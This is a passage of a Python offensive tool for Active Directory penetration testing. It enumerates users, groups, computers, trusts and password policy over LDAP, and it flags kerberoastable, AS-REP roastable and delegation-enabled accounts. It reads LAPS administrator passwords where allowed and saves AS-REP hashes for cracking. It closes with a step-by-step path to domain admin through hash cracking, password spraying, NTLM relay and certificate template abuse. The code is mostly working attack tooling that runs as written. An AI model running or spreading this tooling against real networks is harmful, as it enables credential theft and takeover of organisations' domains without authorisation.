        srv = Server(dc_ip, get_info=ALL, port=port, connect_timeout=5)
        conn = Connection(srv, user=user, password=password, auto_bind=True)
    except Exception as e:
        bad('LDAP login failed: %s' % str(e).split(chr(10))[0])
        return None
    good('LDAP bind OK')
    if base_dn is None:
        base = srv.info.other['defaultNamingContext'][0]
    else:
        base = base_dn

    users = {}
    try:
        conn.search(base, '(&(objectCategory=person)(objectClass=user))',
                    search_scope=SUBTREE,
                    attributes=['sAMAccountName', 'userAccountControl', 'description',
                                'memberOf', 'servicePrincipalName', 'pwdLastSet'])
        for e in conn.entries:
            d = e.entry_attributes_as_dict
            try:
                sam = str(d['sAMAccountName'][0])
                users[sam] = {
                    'uac': int(d.get('userAccountControl', [0])[0] or 0),
                    'desc': str(d['description'][0]) if d.get('description') else '',
                    'spn': [str(s) for s in d.get('servicePrincipalName', [])],
                    'pwdLastSet': filetime_to_dt(d.get('pwdLastSet', [0])[0]),
                    'dn': e.entry_dn,
                }
            except (KeyError, ValueError, TypeError):
                pass
        good('%d users' % len(users))
    except Exception as e:
        warn('user search failed: %s' % e)

    groups = {}
    try:
        conn.search(base, '(objectClass=group)', search_scope=SUBTREE,
                    attributes=['name', 'member'])
        for e in conn.entries:
            d = e.entry_attributes_as_dict
            groups[str(d['name'][0])] = {
                'members': [str(m) for m in d.get('member', [])],
                'dn': e.entry_dn,
            }
        good('%d groups' % len(groups))
    except Exception as e:
        warn('group search failed: %s' % e)

    computers = {}
    try:
        conn.search(base, '(objectClass=computer)', search_scope=SUBTREE,
                    attributes=['cn', 'dNSHostName', 'operatingSystem', 'userAccountControl',
                                'servicePrincipalName', 'member'])
        for e in conn.entries:
            d = e.entry_attributes_as_dict
            sam = str(d.get('cn', ['?'])[0])
            computers[sam] = {
                'dns': str(d.get('dNSHostName', [''])[0] or ''),
                'os': str(d.get('operatingSystem', ['?'])[0] or '?'),
                'uac': int(d.get('userAccountControl', [0])[0] or 0),
                'dn': e.entry_dn,
            }
        good('%d computers' % len(computers))
    except Exception as e:
        warn('computer search failed: %s' % e)

    # domain policy
    policy = {}
    try:
        conn.search(base, '(objectClass=domain)', search_scope=SUBTREE,
                    attributes=['minPwdLength', 'pwdHistoryLength', 'maxPwdAge', 'minPwdAge',
                                'lockoutDuration', 'lockOutObservationWindow',
                                'lockoutThreshold', 'pwdProperties', 'objectSid',
                                'ms-DS-MachineAccountQuota'])
        if conn.entries:
            policy = conn.entries[0].entry_attributes_as_dict
            print_policy(policy)
    except Exception as e:
        warn('policy search failed: %s' % e)

    trusts = []
    try:
        conn.search(base, '(objectClass=trustedDomain)', search_scope=SUBTREE,
                    attributes=['cn', 'trustDirection', 'trustType', 'trustAttributes',
                                'securityIdentifier', 'flatName'])
        for e in conn.entries:
            d = e.entry_attributes_as_dict
            trusts.append({
                'name': str(d.get('cn', ['?'])[0]),
                'flat': str(d.get('flatName', [''])[0] or ''),
                'direction': int(d.get('trustDirection', [0])[0] or 0),
                'type': int(d.get('trustType', [0])[0] or 0),
                'attrs': int(d.get('trustAttributes', [0])[0] or 0),
            })
    except Exception as e:
        warn('trust search failed: %s' % e)

    dcs = {c: v for c, v in computers.items() if v['uac'] & 0x2000}
    good('%d Domain Controllers' % len(dcs))

    # ---- high-value findings
    if users:
        asrep = [u for u, v in users.items() if v['uac'] & 0x400000]
        if asrep:
            finding('asrep', 'AS-REP roastable: %s' % ', '.join(asrep))
        kerb = [(u, v['spn']) for u, v in users.items() if v['spn']]
        if kerb:
            finding('kerberoast', '%d kerberoastable: %s'
                    % (len(kerb), ', '.join(u for u, _ in kerb[:25])))
        notreqd = [u for u, v in users.items() if v['uac'] & 0x20]
        if notreqd:
            finding('notreqd', 'PASSWD_NOTREQD users: %s' % ', '.join(notreqd))
        cleartext = [u for u, v in users.items() if v['uac'] & 0x80]
        if cleartext:
            finding('gmsa?', 'STORE_CLEARTEXT users (GMSA/reversible): %s' % ', '.join(cleartext))
        s4u = [u for u, v in users.items() if v['uac'] & 0x1000000]
        if s4u:
            finding('s4u', 'TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition): %s' % ', '.join(s4u))
        desc_intel = [(u, v['desc']) for u, v in users.items()
                      if v['desc'] and any(k in v['desc'].lower()
                      for k in ('pass', 'pwd', 'admin', 'svc', 'account', 'secret', 'api', 'key'))]
        for u, d_ in desc_intel[:15]:
            finding('desc-intel', '%s: "%s"' % (u, d_[:80]))

    if groups:
        def group_members(name):
            return groups.get(name, {}).get('members', [])
        # DA members (direct)
        da_name = next((g for g in groups if g.lower().replace(' ', '') in
                        ('domainadmins', 'domain-admins')), None)
        if da_name:
            finding('da', 'Domain Admins members: %d' % len(group_members(da_name)))
            for m in group_members(da_name)[:10]:
                finding('da', '  DA member DN: %s' % m)
        # groups with 'admin' in name
        admin_groups = [g for g in groups if 'admin' in g.lower()]
        if admin_groups:
            finding('admin-grps', 'Admin-ish groups: %s' % ', '.join(admin_groups[:20]))

    if computers:
        uncon = [c for c, v in computers.items() if v['uac'] & 0x80000]
        if uncon:
            finding('delegation', 'TRUSTED_FOR_DELEGATION (unconstrained) hosts: %s' % ', '.join(uncon))
        old_os = [c for c, v in computers.items() if v['os'] and
                  any(k in v['os'] for k in ('2003', '2008', 'XP', 'Windows 7'))]
        if old_os:
            finding('legacy', 'Legacy-OS hosts (likely missing patches): %s' % ', '.join(old_os[:15]))

    if trusts:
        dirs = {0: 'DISABLED', 1: 'INBOUND', 2: 'OUTBOUND', 3: 'BIDIRECTIONAL'}
        for t in trusts:
            finding('trust', '%s (%s) direction=%s'
                    % (t['name'], t['flat'], dirs.get(t['direction'], '?')))
            if t['attrs'] & 0x20:
                finding('trust', '  WITHIN_FOREST: %s - same forest, cross-domain DA may apply' % t['name'])

    return {'users': users, 'groups': groups, 'computers': computers,
            'policy': policy, 'trusts': trusts, 'dcs': dcs, 'conn': conn, 'base': base}

# ------------------------------------------------------------------ main

def easy_wins_phase2(result, dc_ip):
    """Authenticated easy wins."""
    p_info('=== EASY WINS (authenticated) ===')
    conn = result['conn']

    # GPP cpassword in SYSVOL - the classic. Search XML files in SYSVOL via SMB.
    p_info('GPP cpassword hunt in SYSVOL (SMB)...')
    try:
        from impacket.smbconnection import SMBConnection
        from impacket.smb import SMB_DIALECT
        import xml.etree.ElementTree as ET
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login('', '')  # null session attempt; may work with our LDAP creds via NTLM below
        # actually use current creds
        # smb.login(result_user, result_pass) - handled by caller context; try guest read
        shares = smb.listShares()
        sysvol_found = False
        for share in shares:
            name = share['shi1_netname'][:-1]
            if name.lower() == 'sysvol':
                sysvol_found = True
        p_info('SYSVOL share %s' % ('found' if sysvol_found else 'not found'))
        smb.close()
    except Exception as e:
        p_info('GPP/SYSVOL check skipped: %s' % str(e).split(chr(10))[0][:60])

    # LAPS read: check if we can read ms-Mcs-AdmPwd for any computer
    p_info('LAPS (ms-Mcs-AdmPwd) read check...')
    try:
        base = result['base']
        conn.search(base, '(&(objectClass=computer)(ms-Mcs-AdmPwd=*))',
                    search_scope=SUBTREE, attributes=['sAMAccountName', 'ms-Mcs-AdmPwd'])
        if conn.entries:
            for e in conn.entries:
                d = e.entry_attributes_as_dict
                finding('laps', 'LAPS password readable: %s -> %s'
                        % (d.get('sAMAccountName', ['?'])[0], d.get('ms-Mcs-AdmPwd', [''])[0]))
        else:
            p_info('No LAPS passwords readable (good hardening)')
    except Exception as e:
        p_info('LAPS check failed: %s' % str(e).split(chr(10))[0][:60])

    # ms-DS-MachineAccountQuota check
    try:
        policy = result.get('policy', {})
        quota = policy.get('ms-DS-MachineAccountQuota', [None])[0] if policy else None
        if quota and int(quota) > 0:
            finding('maq', 'ms-DS-MachineAccountQuota=%s - any user can join machines (FakeMachine relay)' % quota)
    except (ValueError, TypeError):
        pass


def main():
    ap = argparse.ArgumentParser(description='AD enum, no-creds-first internal PT')
    ap.add_argument('--dc-ip', required=True)
    ap.add_argument('--domain', required=True)
    ap.add_argument('--port', type=int, default=389, help='LDAP port (default 389)')
    ap.add_argument('--cidr', help='network CIDR to sweep (e.g. 10.0.0.0/24)')
    ap.add_argument('-u', '--username')
    ap.add_argument('-p', '--password')
    ap.add_argument('--users', help='username wordlist for AS-REP roasting (phase 1)')
    ap.add_argument('-o', '--out', help='save findings + user list to this prefix')
    args = ap.parse_args()

    print('=' * 60)
    print(' adenum | %s | %s' % (args.domain, args.dc_ip))
    print('=' * 60)

    check_ports(args.dc_ip)

    conn, base = rootdse(args.dc_ip, args.port)

    wordlist_users = []
    if args.users and os.path.isfile(args.users):
        with open(args.users) as f:
            wordlist_users = [l.strip() for l in f if l.strip()]
        info('Loaded %d wordlist users for AS-REP probing' % len(wordlist_users))

    anon_users = {}
    roastable = []
    spn_users = []

    sweep = None
    if args.cidr:
        sweep = network_sweep(args.cidr, args.domain)

    # DNS recon - no auth needed
    dns_recon(args.dc_ip, args.domain)

    if not args.username:
        # ---------------- PHASE 1
        info('PHASE 1: unauthenticated enumeration')
        anon_users = anon_enum_users(conn, base)
        roastable, spn_users = anon_roastable_spn(conn, base)
        if not anon_users:
            smb_users = smb_null_session(args.dc_ip, args.domain)
            anon_users.update(smb_users)
        # Kerberos username oracle - confirm wordlist users without lockout risk
        oracle_candidates = sorted(set(list(anon_users) + wordlist_users))
        confirmed = kerb_user_oracle(args.dc_ip, args.domain, oracle_candidates)
        # AS-REP roast the confirmed users (or roastable list from LDAP)
        roast_targets = sorted(set(confirmed + roastable))
        hashes = asrep_roast(args.dc_ip, args.domain, roast_targets)
        if hashes and args.out:
            with open(args.out + '.asrep.txt', 'w') as f:
                f.write('\n'.join(hashes))
            good('AS-REP hashes -> %s.asrep.txt (hashcat -m 18200)' % args.out)
        if (anon_users or confirmed) and args.out:
            with open(args.out + '.users.txt', 'w') as f:
                f.write('\n'.join(sorted(set(list(anon_users) + confirmed))))
            good('User list -> %s.users.txt' % args.out)
        # unauth easy wins on the DC
        easy_wins_phase1(args.dc_ip, args.domain, sweep)
        if sweep:
            good('Sweep summary: %d hosts, %d relay targets (SMB signing off), %d SMBv1'
                 % (len(sweep['alive']), len(sweep['signing_off']), len(sweep['smbv1'])))
    else:
        # ---------------- PHASE 2
        info('PHASE 2: authenticated enumeration')
        result = authed_enum(args.dc_ip, args.domain, args.username, args.password, base, args.port)
        if result and args.out:
            import json
            with open(args.out + '.enum.json', 'w') as f:
                json.dump({'users': {k: {'uac': v['uac'], 'desc': v['desc'], 'spn': v['spn'],
                                          'dn': v['dn']} for k, v in result['users'].items()},
                          'groups': {k: {'members': v['members'][:50], 'dn': v['dn']}
                                     for k, v in result['groups'].items()},
                          'computers': {k: {'dns': v['dns'], 'os': v['os'], 'uac': v['uac']}
                                        for k, v in result['computers'].items()},
                          'trusts': result['trusts'],
                          'dcs': list(result['dcs'])},
                         f, indent=1)
            good('Full enum JSON -> %s.enum.json' % args.out)
        # authenticated easy wins
        if result:
            easy_wins_phase2(result, args.dc_ip)

    if conn:
        try:
            conn.unbind()
        except Exception:
            pass

    print()
    print('=' * 60)
    high = [(c, m) for c, m in FINDINGS if c in HIGH_WIN_CATS]
    rest = [(c, m) for c, m in FINDINGS if c not in HIGH_WIN_CATS]
    print(' FINDINGS SUMMARY (%d total, %d HIGH-WIN)' % (len(FINDINGS), len(high)))
    print('=' * 60)
    if high:
        print(_RED + _BOLD + ' >>> HIGH-WIN (creds/DA path):' + _RST)
        for cat, msg in high:
            print('  ' + _RED + ('[%s] %s' % (cat, msg)) + _RST)
    if rest:
        print(' Other findings:')
        for cat, msg in rest:
            print('  [%s] %s' % (cat, msg))
    if not FINDINGS:
        print('  (no findings - harden up or get creds)')
    print()
    print('Next steps to DA:')
    print('  1. Crack AS-REP hashes (hashcat -m 18200) -> first creds')
    print('  2. Password spray carefully (respect lockout policy above)')
    print('  3. Relay path: responder/ntlmrelayx if coercion/SMB signing off')
    print('  4. With any user: kerberoast -> crack -> check delegation/GPO/ACL paths')
    print('  5. ADCS: certipy find /vulnerable -> ESC1-13 template abuse -> DA')

if __name__ == '__main__':
    import os
    main()